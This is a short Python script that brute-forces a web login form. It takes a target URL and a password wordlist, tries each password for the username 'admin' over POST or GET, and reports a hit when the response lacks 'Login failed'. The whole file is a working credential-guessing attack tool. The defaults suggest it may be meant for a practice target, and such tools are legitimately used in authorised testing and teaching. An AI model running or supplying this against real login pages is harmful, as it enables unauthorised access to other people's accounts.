import requests
import re

def login(target_url, username, password, method='POST'):
    if method == 'POST':
        data = {'username': username, 'password': password, 'Login': 'submit'}
        response = requests.post(target_url, data=data)
    elif method == 'GET':
        params = {'username': username, 'password': password, 'Login': 'submit'}
        response = requests.get(target_url, params=params)
    else:
        raise ValueError("Invalid method. Only 'POST' and 'GET' are supported.")

    return response

def main():
    target_url = input("Enter target URL: ")
    username = 'admin'
    password = 'password'
    method = input("Enter request method (POST or GET): ")

    response = login(target_url, username, password, method)
    print(response.content)

    file_path = input("Enter file path: ")
    with open(file_path, 'r') as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            response = login(target_url, username, word, method)
            if not re.search('Login failed', response.content.decode()):
                print(f"[+] Got the password --> {word}")
                exit()

    print("[+] Reached end of line.")

if __name__ == "__main__":
    main()
